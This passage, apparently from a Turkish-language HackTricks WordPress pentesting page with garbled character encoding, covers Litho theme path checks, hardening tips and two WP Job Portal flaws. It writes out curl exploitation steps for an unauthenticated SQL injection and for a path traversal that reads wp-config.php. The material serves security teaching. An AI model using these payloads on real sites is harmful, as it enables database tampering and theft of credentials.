$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Her zaman** diskteki herhangi bir yazma/silme iÅŸlemini ayrÄ±calÄ±klÄ± olarak deÄŸerlendirin ve iki kez kontrol edin:
> â€¢ Kimlik DoÄŸrulama  â€¢ Yetkilendirme  â€¢ Nonce  â€¢ Girdi temizleme  â€¢ Yol sÄ±nÄ±rlama (Ã¶rneÄŸin, `realpath()` artÄ± `str_starts_with()` ile).

---

## WordPress KorumasÄ±

### DÃ¼zenli GÃ¼ncellemeler

WordPress, eklentiler ve temalarÄ±n gÃ¼ncel olduÄŸundan emin olun. AyrÄ±ca wp-config.php dosyasÄ±nda otomatik gÃ¼ncellemenin etkin olduÄŸunu doÄŸrulayÄ±n:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
AyrÄ±ca, **sadece gÃ¼venilir WordPress eklentileri ve temalarÄ± yÃ¼kleyin**.

### GÃ¼venlik Eklentileri

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **DiÄŸer Ã–neriler**

- VarsayÄ±lan **admin** kullanÄ±cÄ±sÄ±nÄ± kaldÄ±rÄ±n
- **GÃ¼Ã§lÃ¼ ÅŸifreler** ve **2FA** kullanÄ±n
- KullanÄ±cÄ± **izinlerini** periyodik olarak **gÃ¶zden geÃ§irin**
- Brute Force saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in **giriÅŸ denemelerini** sÄ±nÄ±rlayÄ±n
- **`wp-admin.php`** dosyasÄ±nÄ±n adÄ±nÄ± deÄŸiÅŸtirin ve yalnÄ±zca dahili eriÅŸime veya belirli IP adreslerinden eriÅŸime izin verin.

### Yetersiz doÄŸrulama yoluyla kimlik doÄŸrulamasÄ±z SQL Enjeksiyonu (WP Job Portal <= 2.3.2)

WP Job Portal iÅŸe alÄ±m eklentisi, `modules/category/model.php::validateFormData()` iÃ§inde aÅŸaÄŸÄ±daki savunmasÄ±z kodu nihayetinde Ã§alÄ±ÅŸtÄ±ran bir **savecategory** gÃ¶revini aÃ§Ä±ÄŸa Ã§Ä±kardÄ±:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Bu kod parÃ§asÄ±nÄ±n neden olduÄŸu sorunlar:

1. **TemizlenmemiÅŸ kullanÄ±cÄ± giriÅŸi** â€“ `parentid` doÄŸrudan HTTP isteÄŸinden geliyor.
2. **WHERE koÅŸulunda dize birleÅŸtirme** â€“ `is_numeric()` / `esc_sql()` / hazÄ±rlÄ±klÄ± ifade yok.
3. **Kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ eriÅŸilebilirlik** â€“ iÅŸlem `admin-post.php` Ã¼zerinden gerÃ§ekleÅŸtirilse de, mevcut tek kontrol bir **CSRF nonce** (`wp_verify_nonce()`), bu da herhangi bir ziyaretÃ§inin `[wpjobportal_my_resumes]` kÄ±sa kodunu iÃ§eren bir kamu sayfasÄ±ndan alabileceÄŸi bir deÄŸerdir.

#### SÃ¶mÃ¼rÃ¼

1. Yeni bir nonce alÄ±n:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`'yi kÃ¶tÃ¼ye kullanarak keyfi SQL enjekte edin:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
YanÄ±t, enjekte edilen sorgunun sonucunu aÃ§Ä±ÄŸa Ã§Ä±karÄ±r veya veritabanÄ±nÄ± deÄŸiÅŸtirir, bu da SQLi'yi kanÄ±tlar.


### Kimlik DoÄŸrulamasÄ± YapÄ±lmamÄ±ÅŸ Keyfi Dosya Ä°ndirme / Yol Traversali (WP Job Portal <= 2.3.2)

BaÅŸka bir gÃ¶rev, **downloadcustomfile**, ziyaretÃ§ilerin **diskteki herhangi bir dosyayÄ±** yol traversali ile indirmesine izin veriyordu.  AÃ§Ä±k nokta `modules/customfield/model.php::downloadCustomUploadedFile()` iÃ§inde bulunmaktadÄ±r:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` saldÄ±rgan tarafÄ±ndan kontrol ediliyor ve **temizlenmeden** birleÅŸtiriliyor. Yine, tek engel **CSRF nonce**'udur ve bu, Ã¶zgeÃ§miÅŸ sayfasÄ±ndan alÄ±nabilir.

#### SÃ¶mÃ¼rÃ¼
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Sunucu, `wp-config.php` dosyasÄ±nÄ±n iÃ§eriÄŸiyle yanÄ±t verir, DB kimlik bilgilerini ve kimlik doÄŸrulama anahtarlarÄ±nÄ± sÄ±zdÄ±rÄ±r.

## Referanslar

- [Litho TemasÄ±nda Kimlik DoÄŸrulamasÄ± Olmadan Rastgele Dosya Silme AÃ§Ä±ÄŸÄ±](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [WP Ä°ÅŸ PortalÄ± Eklentisinde Birden Fazla Kritik AÃ§Ä±k YamanmÄ±ÅŸtÄ±r](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)

{{#include ../../banners/hacktricks-training.md}}
